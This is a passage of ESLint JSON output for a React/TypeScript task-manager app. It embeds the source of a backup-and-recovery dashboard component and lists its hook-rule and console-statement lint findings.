\"use\".","line":135,"column":3,"nodeType":"Identifier","endLine":135,"endColumn":12},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":190,"column":25,"nodeType":"Identifier","endLine":190,"endColumn":36},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":215,"column":31,"nodeType":"Identifier","endLine":215,"endColumn":42},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":226,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":226,"endColumn":20,"suggestions":[{"fix":{"range":[6608,6687],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":231,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":231,"endColumn":20,"suggestions":[{"fix":{"range":[6809,6859],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":237,"column":31,"nodeType":"Identifier","endLine":237,"endColumn":42},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":259,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":259,"endColumn":24,"suggestions":[{"fix":{"range":[7781,7846],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":266,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":266,"endColumn":20,"suggestions":[{"fix":{"range":[7947,7997],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":271,"column":30,"nodeType":"Identifier","endLine":271,"endColumn":41},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":276,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":276,"endColumn":20,"suggestions":[{"fix":{"range":[8270,8324],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":279,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":279,"endColumn":20,"suggestions":[{"fix":{"range":[8361,8410],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":414,"column":53,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":414,"endColumn":56,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13297,13300],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13297,13300],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Move your component(s) to a separate file.","line":476,"column":7,"nodeType":"Identifier","messageId":"localComponents","endLine":476,"endColumn":46},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Move your component(s) to a separate file.","line":581,"column":7,"nodeType":"Identifier","messageId":"localComponents","endLine":581,"endColumn":44},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Move your component(s) to a separate file.","line":707,"column":7,"nodeType":"Identifier","messageId":"localComponents","endLine":707,"endColumn":84},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Move your component(s) to a separate file.","line":714,"column":7,"nodeType":"Identifier","messageId":"localComponents","endLine":714,"endColumn":84}],"suppressedMessages":[],"errorCount":13,"fatalErrorCount":0,"warningCount":22,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Recovery Dashboard Component (2025)\n * \n * Comprehensive dashboard for managing state backups, recovery operations,\n * and monitoring application health. Provides both automatic and manual\n * recovery options with detailed analytics and user controls.\n * \n * Features:\n * - Real-time backup monitoring\n * - Manual backup creation and restoration\n * - Health status visualization\n * - Recovery history tracking\n * - Performance analytics\n * - Export/import capabilities\n */\n\nimport React, { useState, useEffect, useCallback } from 'react';\nimport { motion, AnimatePresence } from 'framer-motion';\nimport { \n  Shield, \n  Clock, \n  Database, \n  AlertTriangle, \n  CheckCircle, \n  Download, \n  Upload, \n  Trash2, \n  RefreshCw,\n  Settings,\n  Activity,\n  Info,\n  TrendingUp,\n  TrendingDown,\n  Minus,\n  FileText,\n  Gauge\n} from 'lucide-react';\nimport { useTaskStore } from '@/store/useTaskStore';\nimport { useErrorStore } from '@/store/errorStore';\nimport { createStateBackup, StateBackupManager, BackupStats } from '@/store/stateBackup';\nimport { CrashRecoveryService, HealthStatus } from '@/lib/services/crashRecovery';\n\n// Recovery dashboard props\nexport interface RecoveryDashboardProps {\n  onClose?: () => void;\n  className?: string;\n}\n\n// Backup display information\ninterface BackupDisplayInfo {\n  id: string;\n  storeName: string;\n  timestamp: number;\n  size: number;\n  isHealthy: boolean;\n  metadata: {\n    version: string;\n    compressionEnabled: boolean;\n    dataSize: number;\n  };\n}\n\n// Health metrics for display\ninterface HealthMetrics {\n  overall: 'healthy' | 'warning' | 'critical';\n  score: number;\n  issues: string[];\n  backupStatus: 'active' | 'inactive' | 'error';\n  lastBackup: number | null;\n  recoveryRate: number;\n}\n\n/**\n * Main recovery dashboard component\n */\nexport const _RecoveryDashboard: React.FC<RecoveryDashboardProps> = ({ \n  onClose, \n  className = '' \n}) => {\n  // State management\n  const [activeTab, setActiveTab] = useState<'overview' | 'backups' | 'recovery' | 'settings'>('overview');\n  const [backupManagers, setBackupManagers] = useState<Record<string, StateBackupManager>>({});\n  const [healthMetrics, setHealthMetrics] = useState<HealthMetrics>({\n    overall: 'healthy',\n    score: 100,\n    issues: [],\n    backupStatus: 'active',\n    lastBackup: null,\n    recoveryRate: 100\n  });\n  const [loading, setLoading] = useState(true);\n  const [selectedBackups, setSelectedBackups] = useState<Set<string>>(new Set());\n\n  // Store references\n  const taskStore = useTaskStore();\n  const errorStore = useErrorStore();\n\n  // Initialize backup managers\n  useEffect(() => {\n    const initializeBackupManagers = () => {\n      const managers: Record<string, StateBackupManager> = {\n        tasks: createStateBackup(taskStore as any, {\n          storageKey: 'backup_tasks',\n          backupInterval: 3000,\n          maxBackups: 10,\n          enableCompression: true,\n          enableIntegrityCheck: true,\n          enableTelemetry: true\n        }),\n        errors: createStateBackup(errorStore as any, {\n          storageKey: 'backup_errors',\n          backupInterval: 5000,\n          maxBackups: 5,\n          enableCompression: true,\n          enableIntegrityCheck: true,\n          enableTelemetry: true\n        })\n      };\n\n      setBackupManagers(managers);\n      setLoading(false);\n    };\n\n    initializeBackupManagers();\n\n    // Cleanup on unmount\n    return () => {\n      Object.values(backupManagers).forEach(manager => {\n        manager.destroy();\n      });\n    };\n  }, []);\n\n  // Update health metrics periodically\n  useEffect(() => {\n    const updateHealthMetrics = () => {\n      const allStats: BackupStats[] = Object.values(backupManagers).map(manager => \n        manager.getStats()\n      );\n\n      if (allStats.length === 0) return;\n\n      // Calculate overall health\n      const totalBackups = allStats.reduce((sum, stats) => sum + stats.totalBackups, 0);\n      const totalFailed = allStats.reduce((sum, stats) => sum + stats.failedBackups, 0);\n      const successRate = totalBackups > 0 ? ((totalBackups - totalFailed) / totalBackups) * 100 : 100;\n      \n      const lastBackupTimes = allStats\n        .map(stats => stats.lastBackupTime)\n        .filter(time => time !== null) as number[];\n      \n      const lastBackup = lastBackupTimes.length > 0 ? Math.max(...lastBackupTimes) : null;\n      \n      // Determine overall status\n      let overall: 'healthy' | 'warning' | 'critical' = 'healthy';\n      const issues: string[] = [];\n      \n      if (successRate < 90) {\n        overall = 'critical';\n        issues.push('Low backup success rate');\n      } else if (successRate < 95) {\n        overall = 'warning';\n        issues.push('Moderate backup failures');\n      }\n\n      if (lastBackup && Date.now() - lastBackup > 600000) { // 10 minutes\n        overall = overall === 'healthy' ? 'warning' : 'critical';\n        issues.push('Backups are outdated');\n      }\n\n      const healthScore = Math.round(successRate);\n\n      setHealthMetrics({\n        overall,\n        score: healthScore,\n        issues,\n        backupStatus: issues.length === 0 ? 'active' : 'error',\n        lastBackup,\n        recoveryRate: successRate\n      });\n    };\n\n    const interval = setInterval(updateHealthMetrics, 5000);\n    updateHealthMetrics(); // Initial update\n\n    return () => clearInterval(interval);\n  }, [backupManagers]);\n\n  // Get all backups for display\n  const getAllBackups = useCallback((): BackupDisplayInfo[] => {\n    const allBackups: BackupDisplayInfo[] = [];\n\n    Object.entries(backupManagers).forEach(([storeName, manager]) => {\n      const backups = manager.getBackups();\n      backups.forEach(backup => {\n        allBackups.push({\n          id: backup.id,\n          storeName,\n          timestamp: backup.timestamp,\n          size: backup.metadata.dataSize,\n          isHealthy: true, // TODO: Add health check\n          metadata: {\n            version: backup.version || '1.0.0',\n            compressionEnabled: backup.metadata.compressionEnabled || false,\n            dataSize: backup.metadata.dataSize\n          }\n        });\n      });\n    });\n\n    return allBackups.sort((a, b) => b.timestamp - a.timestamp);\n  }, [backupManagers]);\n\n  // Handle backup restoration\n  const handleRestoreBackup = useCallback(async (backupId: string, storeName: string) => {\n    try {\n      const manager = backupManagers[storeName];\n      if (!manager) {\n        throw new Error(`No backup manager found for store: ${storeName}`);\n      }\n\n      const result = manager.restoreFromBackup(backupId);\n      \n      if (result.success) {\n        // Show success notification\n        console.log(`Successfully restored backup ${backupId} for store ${storeName}`);\n      } else {\n        throw new Error(result.error || 'Unknown restoration error');\n      }\n    } catch (error) {\n      console.error('Failed to restore backup:', error);\n      // Show error notification\n    }\n  }, [backupManagers]);\n\n  // Handle backup deletion\n  const handleDeleteBackups = useCallback(async (backupIds: string[]) => {\n    try {\n      // Group backups by store\n      const allBackups = getAllBackups();\n      const backupsByStore: Record<string, string[]> = {};\n      \n      backupIds.forEach(id => {\n        const backup = allBackups.find(b => b.id === id);\n        if (backup) {\n          if (!backupsByStore[backup.storeName]) {\n            backupsByStore[backup.storeName] = [];\n          }\n          backupsByStore[backup.storeName].push(id);\n        }\n      });\n\n      // Delete from each store\n      Object.entries(backupsByStore).forEach(([storeName, ids]) => {\n        const manager = backupManagers[storeName];\n        if (manager) {\n          ids.forEach(id => {\n            // Note: The StateBackupManager interface would need a deleteBackup method\n            console.log(`Would delete backup ${id} from store ${storeName}`);\n          });\n        }\n      });\n\n      setSelectedBackups(new Set());\n    } catch (error) {\n      console.error('Failed to delete backups:', error);\n    }\n  }, [backupManagers, getAllBackups]);\n\n  // Handle forced backup creation\n  const handleCreateBackup = useCallback(async (storeName: string) => {\n    try {\n      const manager = backupManagers[storeName];\n      if (manager) {\n        manager.forceBackup();\n        console.log(`Backup created for store: ${storeName}`);\n      }\n    } catch (error) {\n      console.error('Failed to create backup:', error);\n    }\n  }, [backupManagers]);\n\n  // Format file size\n  const formatFileSize = (bytes: number): string => {\n    if (bytes === 0) return '0 B';\n    const k = 1024;\n    const sizes = ['B', 'KB', 'MB', 'GB'];\n    const i = Math.floor(Math.log(bytes) / Math.log(k));\n    return `${parseFloat((bytes / Math.pow(k, i)).toFixed(1))} ${sizes[i]}`;\n  };\n\n  // Format timestamp\n  const formatTimestamp = (timestamp: number): string => {\n    return new Date(timestamp).toLocaleString();\n  };\n\n  // Calculate time ago\n  const timeAgo = (timestamp: number): string => {\n    const now = Date.now();\n    const diff = now - timestamp;\n    const minutes = Math.floor(diff / 60000);\n    const hours = Math.floor(diff / 3600000);\n    const days = Math.floor(diff / 86400000);\n\n    if (days > 0) return `${days}d ago`;\n    if (hours > 0) return `${hours}h ago`;\n    if (minutes > 0) return `${minutes}m ago`;\n    return 'Just now';\n  };\n\n  if (loading) {\n    return (\n      <div className=\"flex items-center justify-center h-64\">\n        <motion.div\n          animate={{ rotate: 360 }}\n          transition={{ duration: 1, repeat: Infinity, ease: \"linear\" }}\n        >\n          <RefreshCw size={24} className=\"text-primary\" />\n        </motion.div>\n      </div>\n    );\n  }\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, y: 20 }}\n      animate={{ opacity: 1, y: 0 }}\n      className={`bg-card rounded-lg border shadow-lg ${className}`}\n    >\n      {/* Header */}\n      <div className=\"flex items-center justify-between p-6 border-b\">\n        <div className=\"flex items-center gap-3\">\n          <Shield className=\"w-6 h-6 text-primary\" />\n          <div>\n            <h2 className=\"text-xl font-semibold\">Recovery Dashboard</h2>\n            <p className=\"text-sm text-muted-foreground\">\n              Manage state backups and recovery operations\n            </p>\n          </div>\n        </div>\n        {onClose && (\n          <button\n            onClick={onClose}\n            className=\"p-2 hover:bg-muted rounded-lg transition-colors\"\n          >\n            Ã—\n          </button>\n        )}\n      </div>\n\n      {/* Health Status */}\n      <div className=\"p-6 border-b\">\n        <div className=\"flex items-center gap-4 mb-4\">\n          <div className={`p-3 rounded-full ${\n            healthMetrics.overall === 'healthy' ? 'bg-green-100 text-green-600' :\n            healthMetrics.overall === 'warning' ? 'bg-yellow-100 text-yellow-600' :\n            'bg-red-100 text-red-600'\n          }`}>\n            {healthMetrics.overall === 'healthy' ? <CheckCircle size={24} /> :\n             healthMetrics.overall === 'warning' ? <AlertTriangle size={24} /> :\n             <AlertTriangle size={24} />}\n          </div>\n          <div className=\"flex-1\">\n            <div className=\"flex items-center gap-2 mb-1\">\n              <span className=\"font-medium\">System Health</span>\n              <span className={`text-sm px-2 py-1 rounded-full ${\n                healthMetrics.overall === 'healthy' ? 'bg-green-100 text-green-700' :\n                healthMetrics.overall === 'warning' ? 'bg-yellow-100 text-yellow-700' :\n                'bg-red-100 text-red-700'\n              }`}>\n                {healthMetrics.overall}\n              </span>\n            </div>\n            <div className=\"flex items-center gap-4 text-sm text-muted-foreground\">\n              <span className=\"flex items-center gap-1\">\n                <Gauge size={14} />\n                Score: {healthMetrics.score}%\n              </span>\n              <span className=\"flex items-center gap-1\">\n                <Clock size={14} />\n                Last backup: {healthMetrics.lastBackup ? timeAgo(healthMetrics.lastBackup) : 'Never'}\n              </span>\n            </div>\n          </div>\n        </div>\n\n        {/* Issues */}\n        {healthMetrics.issues.length > 0 && (\n          <div className=\"bg-yellow-50 border border-yellow-200 rounded-lg p-3\">\n            <div className=\"flex items-center gap-2 mb-2\">\n              <AlertTriangle size={16} className=\"text-yellow-600\" />\n              <span className=\"font-medium text-yellow-800\">Issues Detected</span>\n            </div>\n            <ul className=\"text-sm text-yellow-700 space-y-1\">\n              {healthMetrics.issues.map((issue, index) => (\n                <li key={index}>â€¢ {issue}</li>\n              ))}\n            </ul>\n          </div>\n        )}\n      </div>\n\n      {/* Tabs */}\n      <div className=\"border-b\">\n        <nav className=\"flex space-x-8 px-6\">\n          {[\n            { id: 'overview', label: 'Overview', icon: Activity },\n            { id: 'backups', label: 'Backups', icon: Database },\n            { id: 'recovery', label: 'Recovery', icon: RefreshCw },\n            { id: 'settings', label: 'Settings', icon: Settings }\n          ].map(tab => (\n            <button\n              key={tab.id}\n              onClick={() => setActiveTab(tab.id as any)}\n              className={`flex items-center gap-2 py-4 border-b-2 transition-colors ${\n                activeTab === tab.id\n                  ? 'border-primary text-primary'\n                  : 'border-transparent text-muted-foreground hover:text-foreground'\n              }`}\n            >\n              <tab.icon size={16} />\n              {tab.label}\n            </button>\n          ))}\n        </nav>\n      </div>\n\n      {/* Tab Content */}\n      <div className=\"p-6\">\n        <AnimatePresence mode=\"wait\">\n          {activeTab === 'overview' && (\n            <OverviewTab \n              key=\"overview\"\n              backupManagers={backupManagers}\n              healthMetrics={healthMetrics}\n            />\n          )}\n          {activeTab === 'backups' && (\n            <BackupsTab\n              key=\"backups\"\n              backups={getAllBackups()}\n              selectedBackups={selectedBackups}\n              onSelectionChange={setSelectedBackups}\n              onRestore={handleRestoreBackup}\n              onDelete={handleDeleteBackups}\n              onCreateBackup={handleCreateBackup}\n              formatFileSize={formatFileSize}\n              formatTimestamp={formatTimestamp}\n              timeAgo={timeAgo}\n            />\n          )}\n          {activeTab === 'recovery' && (\n            <RecoveryTab\n              key=\"recovery\"\n              backupManagers={backupManagers}\n            />\n          )}\n          {activeTab === 'settings' && (\n            <SettingsTab\n              key=\"settings\"\n              backupManagers={backupManagers}\n            />\n          )}\n        </AnimatePresence>\n      </div>\n    </motion.div>\n  );\n};\n\n// Overview Tab Component\ninterface OverviewTabProps {\n  backupManagers: Record<string, StateBackupManager>;\n  healthMetrics: HealthMetrics;\n}\n\nconst OverviewTab: React.FC<OverviewTabProps> = ({ backupManagers, healthMetrics }) => {\n  const stats = Object.entries(backupManagers).map(([name, manager]) => ({\n    name,\n    stats: manager.getStats()\n  }));\n\n  return (\n    <motion.div\n      initial={{ opacity: 0 }}\n      animate={{ opacity: 1 }}\n      className=\"space-y-6\"\n    >\n      {/* Stats Cards */}\n      <div className=\"grid grid-cols-1 md:grid-cols-3 gap-4\">\n        <div className=\"bg-muted/50 rounded-lg p-4\">\n          <div className=\"flex items-center justify-between mb-2\">\n            <span className=\"text-sm font-medium text-muted-foreground\">Total Backups</span>\n            <Database size={16} className=\"text-primary\" />\n          </div>\n          <div className=\"text-2xl font-bold\">\n            {stats.reduce((sum, { stats }) => sum + stats.totalBackups, 0)}\n          </div>\n        </div>\n\n        <div className=\"bg-muted/50 rounded-lg p-4\">\n          <div className=\"flex items-center justify-between mb-2\">\n            <span className=\"text-sm font-medium text-muted-foreground\">Success Rate</span>\n            <TrendingUp size={16} className=\"text-green-600\" />\n          </div>\n          <div className=\"text-2xl font-bold\">\n            {Math.round(healthMetrics.recoveryRate)}%\n          </div>\n        </div>\n\n        <div className=\"bg-muted/50 rounded-lg p-4\">\n          <div className=\"flex items-center justify-between mb-2\">\n            <span className=\"text-sm font-medium text-muted-foreground\">Storage Used</span>\n            <Activity size={16} className=\"text-blue-600\" />\n          </div>\n          <div className=\"text-2xl font-bold\">\n            {Math.round(stats.reduce((sum, { stats }) => sum + stats.totalStorageUsed, 0) / 1024)} KB\n          </div>\n        </div>\n      </div>\n\n      {/* Store Status */}\n      <div className=\"space-y-4\">\n        <h3 className=\"text-lg font-semibold\">Store Status</h3>\n        {stats.map(({ name, stats }) => (\n          <div key={name} className=\"border rounded-lg p-4\">\n            <div className=\"flex items-center justify-between mb-3\">\n              <div className=\"flex items-center gap-2\">\n                <span className=\"font-medium capitalize\">{name} Store</span>\n                <span className={`w-2 h-2 rounded-full ${\n                  stats.failedBackups === 0 ? 'bg-green-500' : 'bg-red-500'\n                }`} />\n              </div>\n              <span className=\"text-sm text-muted-foreground\">\n                {stats.totalBackups} backups\n              </span>\n            </div>\n            <div className=\"grid grid-cols-2 md:grid-cols-4 gap-4 text-sm\">\n              <div>\n                <span className=\"text-muted-foreground\">Success Rate</span>\n                <div className=\"font-medium\">\n                  {stats.totalBackups > 0 \n                    ? Math.round(((stats.totalBackups - stats.failedBackups) / stats.totalBackups) * 100)\n                    : 100}%\n                </div>\n              </div>\n              <div>\n                <span className=\"text-muted-foreground\">Avg Size</span>\n                <div className=\"font-medium\">{Math.round(stats.averageBackupSize / 1024)} KB</div>\n              </div>\n              <div>\n                <span className=\"text-muted-foreground\">Last Backup</span>\n                <div className=\"font-medium\">\n                  {stats.lastBackupTime ? new Date(stats.lastBackupTime).toLocaleTimeString() : 'Never'}\n                </div>\n              </div>\n              <div>\n                <span className=\"text-muted-foreground\">Compression</span>\n                <div className=\"font-medium\">{Math.round((1 - stats.compressionRatio) * 100)}%</div>\n              </div>\n            </div>\n          </div>\n        ))}\n      </div>\n    </motion.div>\n  );\n};\n\n// Backups Tab Component\ninterface BackupsTabProps {\n  backups: BackupDisplayInfo[];\n  selectedBackups: Set<string>;\n  onSelectionChange: (selected: Set<string>) => void;\n  onRestore: (backupId: string, storeName: string) => void;\n  onDelete: (backupIds: string[]) => void;\n  onCreateBackup: (storeName: string) => void;\n  formatFileSize: (bytes: number) => string;\n  formatTimestamp: (timestamp: number) => string;\n  timeAgo: (timestamp: number) => string;\n}\n\nconst BackupsTab: React.FC<BackupsTabProps> = ({\n  backups,\n  selectedBackups,\n  onSelectionChange,\n  onRestore,\n  onDelete,\n  onCreateBackup,\n  formatFileSize,\n  formatTimestamp,\n  timeAgo\n}) => {\n  const handleSelectAll = () => {\n    if (selectedBackups.size === backups.length) {\n      onSelectionChange(new Set());\n    } else {\n      onSelectionChange(new Set(backups.map(b => b.id)));\n    }\n  };\n\n  const handleSelectBackup = (backupId: string) => {\n    const newSelected = new Set(selectedBackups);\n    if (newSelected.has(backupId)) {\n      newSelected.delete(backupId);\n    } else {\n      newSelected.add(backupId);\n    }\n    onSelectionChange(newSelected);\n  };\n\n  return (\n    <motion.div\n      initial={{ opacity: 0 }}\n      animate={{ opacity: 1 }}\n      className=\"space-y-4\"\n    >\n      {/* Actions */}\n      <div className=\"flex items-center justify-between\">\n        <div className=\"flex items-center gap-2\">\n          <button\n            onClick={handleSelectAll}\n            className=\"text-sm text-primary hover:underline\"\n          >\n            {selectedBackups.size === backups.length ? 'Deselect All' : 'Select All'}\n          </button>\n          {selectedBackups.size > 0 && (\n            <button\n              onClick={() => onDelete(Array.from(selectedBackups))}\n              className=\"flex items-center gap-1 px-3 py-1 text-sm bg-destructive text-destructive-foreground rounded hover:bg-destructive/90\"\n            >\n              <Trash2 size={14} />\n              Delete ({selectedBackups.size})\n            </button>\n          )}\n        </div>\n        <div className=\"flex items-center gap-2\">\n          <button\n            onClick={() => onCreateBackup('tasks')}\n            className=\"flex items-center gap-1 px-3 py-1 text-sm bg-primary text-primary-foreground rounded hover:bg-primary/90\"\n          >\n            <Database size={14} />\n            Backup Tasks\n          </button>\n          <button\n            onClick={() => onCreateBackup('errors')}\n            className=\"flex items-center gap-1 px-3 py-1 text-sm bg-secondary text-secondary-foreground rounded hover:bg-secondary/90\"\n          >\n            <Database size={14} />\n            Backup Errors\n          </button>\n        </div>\n      </div>\n\n      {/* Backup List */}\n      <div className=\"space-y-2\">\n        {backups.length === 0 ? (\n          <div className=\"text-center py-8 text-muted-foreground\">\n            <Database size={48} className=\"mx-auto mb-4 opacity-50\" />\n            <p>No backups available</p>\n            <p className=\"text-sm\">Create your first backup using the buttons above</p>\n          </div>\n        ) : (\n          backups.map((backup) => (\n            <motion.div\n              key={backup.id}\n              initial={{ opacity: 0, y: 10 }}\n              animate={{ opacity: 1, y: 0 }}\n              className=\"border rounded-lg p-4 hover:bg-muted/50 transition-colors\"\n            >\n              <div className=\"flex items-center gap-3\">\n                <input\n                  type=\"checkbox\"\n                  checked={selectedBackups.has(backup.id)}\n                  onChange={() => handleSelectBackup(backup.id)}\n                  className=\"rounded\"\n                />\n                <div className=\"flex-1\">\n                  <div className=\"flex items-center gap-2 mb-1\">\n                    <span className=\"font-medium capitalize\">{backup.storeName}</span>\n                    <span className={`w-2 h-2 rounded-full ${\n                      backup.isHealthy ? 'bg-green-500' : 'bg-red-500'\n                    }`} />\n                    <span className=\"text-sm text-muted-foreground\">\n                      {formatFileSize(backup.size)}\n                    </span>\n                  </div>\n                  <div className=\"text-sm text-muted-foreground\">\n                    {formatTimestamp(backup.timestamp)} â€¢ {timeAgo(backup.timestamp)}\n                  </div>\n                </div>\n                <button\n                  onClick={() => onRestore(backup.id, backup.storeName)}\n                  className=\"flex items-center gap-1 px-3 py-1 text-sm bg-primary text-primary-foreground rounded hover:bg-primary/90\"\n                >\n                  <RefreshCw size={14} />\n                  Restore\n                </button>\n              </div>\n            </motion.div>\n          ))\n        )}\n      </div>\n    </motion.div>\n  );\n};\n\n// Recovery Tab Component (simplified for brevity)\nconst RecoveryTab: React.FC<{ backupManagers: Record<string, StateBackupManager> }> = () => (\n  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>\n    <p className=\"text-muted-foreground\">Recovery operations and crash detection settings...</p>\n  </motion.div>\n);\n\n// Settings Tab Component (simplified for brevity)  \nconst SettingsTab: React.FC<{ backupManagers: Record<string, StateBackupManager> }> = () => (\n  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>\n    <p className=\"text-muted-foreground\">Backup and recovery configuration settings...</p>\n  </motion.div>\n);\n\nexport default _RecoveryDashboard;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/recovery/RecoveryNotification.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Download' is defined but never used.","line":24,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":24,"endColumn":11},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Eye' is defined but never used.","line":25,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":25,"endColumn":6},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Settings' is defined but never used.","line":26,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":26,"endColumn":11},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":44,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":44,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1168,1171],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1168,1171],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryNotification: React.FC<RecoveryNotificationProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":80,"column":37,"nodeType":"Identifier","endLine":80,"endColumn":45},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryNotification: React.FC<RecoveryNotificationProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":81,"column":45,"nodeType":"Identifier","endLine":81,"endColumn":53},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useEffect\" is called in function \"_RecoveryNotification: React.FC<RecoveryNotificationProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":84,"column":3,"nodeType":"Identifier","endLine":84,"endColumn":12},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has a missing dependency: 'handleDismiss'. Either include it or remove the dependency array.","line":92,"column":6,"nodeType":"ArrayExpression","endLine":92,"endColumn":54,"suggestions":[{"desc":"Update the dependencies array to be: [handleDismiss, notification.duration, notification.persistent]","fix":{"range":[2512,2560],"text":"[handleDismiss, notification.duration, notification.persistent]"}}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryNotification: React.FC<RecoveryNotificationProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":94,"column":25,"nodeType":"Identifier","endLine":94,"endColumn":36},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryNotification: React.FC<RecoveryNotificationProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":102,"column":29,"nodeType":"Identifier","endLine":102,"endColumn":40},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":112,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":112,"endColumn":20,"suggestions":[{"fix":{"range":[3141,3193],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryNotificationManager: React.FC<RecoveryNotificationManagerProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":282,"column":45,"nodeType":"Identifier","endLine":282,"endColumn":53},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryNotificationManager: React.FC<RecoveryNotificationManagerProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":285,"column":27,"nodeType":"Identifier","endLine":285,"endColumn":38},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryNotificationManager: React.FC<RecoveryNotificationManagerProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":304,"column":30,"nodeType":"Identifier","endLine":304,"endColumn":41},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryNotificationManager: React.FC<RecoveryNotificationManagerProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word 